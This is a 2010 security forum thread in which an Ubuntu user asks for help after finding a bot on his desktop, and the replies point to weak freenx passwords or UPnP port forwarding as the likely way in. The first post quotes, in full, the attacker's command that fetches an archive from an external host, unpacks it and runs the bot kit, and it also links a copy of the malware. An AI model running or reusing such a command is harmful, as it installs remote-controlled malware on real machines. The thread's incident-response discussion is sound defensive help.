---
title: "need help with multi-mech backdoor threat"
date: 2010-07-29
forum: Security
---

### Post by marbour on 2010-07-29
Hi.

I am totally amazed as how my lounge ubuntu 10.04 desktop got hacked. Pressing the up arrow one single time in xterm got me the following:

```
cd /tmp;mkdir .,.;cd .,.;wget http://mikutzul.100free.com/LiDaFrMECH.tar;tar xvf LiDaFrMECH.tar;rm -rf LiDaFrMECH.tar;cd .em;chmod +x *;./start kit;exit
```For those interested: I have put the file on my ftp at http:// ci2.ca / files / LiDaFRMECH.tar (see that I have put spaces in the link for it not to be too easily clickable. Downloading it on a Windows system, Avast reported it as an ELF_RST.B type attack.

Can anyone help me identify what this bot is and how it could have gotten installed into my "me only access" computer. It's not even going on the net. It's plugged into my home network, but the fixed IP on it has no port forwarded from the router. What troubles me is that this is the very last command ran after the last time I logged into the shell of this system some few hours ago.

Here is the list of things I did in this system:

[LIST=1]
[*]installed ubuntu 10.04 on a frech new system
[*]updated ubuntu
[*]installed xbmc and filezilla (to only ftp enormous files from my dedicated server to my home only...)
[*]installed freenx (terminal client citrix like) as per ubuntu's procedure
[/LIST]
And all these were done a long while ago. This system has ran for weeks now. Except freenx that is recent.

I have identified that this is a bot. Killed the process numerous  times... Removed the hidden folder in tmp and rebooted. I don't really  know if this did the trick.

Can anyone help me identify what this is and where to look in order to "clean" my system?

Best regards.

---

### Post by wacky_sung on 2010-07-30
Have you got any of your outdated installed software such as freenx?Did you install any firewall?

---

### Post by OpSecShellshock on 2010-07-30
Well, just looking over the request for the tar file, it's clear that it was initiated from your computer and was not due to an intrusion from outside. Whatever the cause was, this event was not the beginning of it, but rather was a result of something that had happened earlier. My guess is that this was a script embedded in some other file that was run by a legitimate user. It would have required some kind of elevated privileges to work properly from the look of things. If it was successful (i.e. the directories that the script didn't remove during installation are still there) then you should reinstall.

If you want to see if you can find out what process was responsible, you'll need to check the time stamps on the event and also identify the user. Then just try to recall what that user was doing at that time.

I'd recommend checking your ftp server out as well. Make sure the only things there are things that are supposed to be there.

---

### Post by cdenley on 2010-07-30
My guess is you enabled "Remote Desktop" and checked the "configure network automatically to accept connections" box to automatically port-forward VNC in your router using UPnP.

System>Preferences>Remote Desktop

This seems to happen a lot.

---

### Post by bodhi.zazen on 2010-07-30
The OP stated s/he installed freenx. Most likely a weak password was used.

I advise you re-install and in the future use strong passwords, use fail2bad to block brute force cracking attempts, and, better, learn to use ssh rather then VNC.

With ssh use keys and disable passwords. You can either forward X applications or tunnel VNC over ssh.

---

### Post by cdenley on 2010-07-30
> **bodhi.zazen said:**
> The OP stated s/he installed freenx. Most likely a weak password was used.


Does freenx also use UPnP to port forward?
> **marbour said:**
> 
the fixed IP on it has no port forwarded from the router


---

### Post by bodhi.zazen on 2010-07-30
> **cdenley said:**
> Does freenx also use UPnP to port forward?

IDK, but either some port is forwarded or it was an inside job.

---

### Post by cdenley on 2010-07-30
> **bodhi.zazen said:**
> IDK, but either some port is forwarded or it was an inside job.

Well, some port was probably forwarded with UPnP without him realizing it. A lot of people don't seem to realize they have UPnP enabled, and assume if they don't create port forward rules in their router's configuration, everything not related to a connection they established should be filtered regardless of how their system is configured.

---

### Post by bodhi.zazen on 2010-07-30
> **cdenley said:**
> well, some port was probably forwarded with upnp without him realizing it. A lot of people don't seem to realize they have upnp enabled, and assume if they don't create port forward rules in their router's configuration, everything not related to a connection they established should be filtered regardless of how their system is configured.

+1

---

